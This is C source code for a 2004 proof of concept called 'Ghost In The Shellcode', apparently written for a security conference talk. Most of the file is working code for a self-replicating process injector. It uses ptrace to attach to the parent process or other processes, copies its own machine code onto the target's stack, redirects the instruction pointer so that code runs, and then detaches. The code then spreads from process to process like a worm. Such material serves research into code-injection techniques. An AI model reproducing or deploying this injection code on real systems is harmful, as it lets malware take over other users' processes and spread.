/* Ghost In The Shellcode
 *
 * WARNING: Don't run this PoC if you don't know what it is.
 * See http://www.secdev.org/conf/shellforgeG2_csw04.pdf for more infos.
 *
 * Note: this is not well coded, yet.
 * Known bugs: need at least 3 processes to infect
 * 
 * Copyright (C) 2004  Philippe Biondi <phil@secdev.org>
 * 
 * $Id$
 */


#include <sys/user.h>
#define ERESTARTSYS     512
#define ERESTARTNOINTR  513
#define ERESTARTNOHAND  514     /* restart if no handler.. */
#define WUNTRACED       2       /* Report status of stopped children.  */

#define LOADSZ 1900

static char gen = 'A';
static char digits[] = "0123456789";
static struct timespec slptime = {
	.tv_sec  = 0,
	.tv_nsec = 900000000,
};

#define PLEN 15
static int pnum = 0;
static int mode = 0;

static int path[PLEN] = {0,1,2,3,4,5,6,7,8,9,0,1,2,3,4};

static int main(void)
{
	int pid, old_eip,start,i, ok;
        struct user_regs_struct regs;

	__asm__("pusha");


	/*** exec the mission ***/
	pid = getpid();
	write(1,"Hi, I'm gen [",13);
	write(1,&gen,1);
	write(1,"] from pid [",12);
	write(1,&digits[(pid/10000)%10],1);
	write(1,&digits[(pid/1000)%10],1);
	write(1,&digits[(pid/100)%10],1);
	write(1,&digits[(pid/10)%10],1);
	write(1,&digits[pid%10],1);
	write(1,"]\n",2);
	nanosleep(&slptime, NULL);
	gen++;

	/*** replicate ***/
	ok = 0;
	do {
        	if (mode == 0) {
        		pid = getppid();
			if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
        			mode = 1;
        		else {
        			ok = 1;
				if (pnum < PLEN)
					path[pnum++] = getpid();
			}
        	}
        	if (mode == 1) {
			if (!pnum) {
				mode = 0;
				continue;
			}
        		pid = path[--pnum];
                	if (!ptrace(PTRACE_ATTACH, pid, NULL, NULL))
				ok = 1;
		}
	} while (!ok);
			
			

        waitpid(pid, 0, WUNTRACED);
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);	
        start = regs.esp-1024-LOADSZ;
        for (i=0; i < LOADSZ; i+=4) 
                ptrace(PTRACE_POKEDATA, pid, (void *)(start+i), (void *)*(int *)(((unsigned char *)(&main))+i) );

        /*** Change execution flow ***/
        old_eip = regs.eip;
        regs.eip = start;
        if ( (regs.orig_eax >= 0) &&
             (regs.eax == -ERESTARTNOHAND ||
              regs.eax == -ERESTARTSYS ||
              regs.eax == -ERESTARTNOINTR) ) {
                regs.eip += 2;
                old_eip -= 2;
        }

        /*** push eip ***/
        regs.esp -= 4;
        ptrace(PTRACE_POKEDATA, pid, (char *)regs.esp, (char *)old_eip);

        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);

	if (gen == 'B') exit(0);
	
	__asm__("popa");
}

	
	
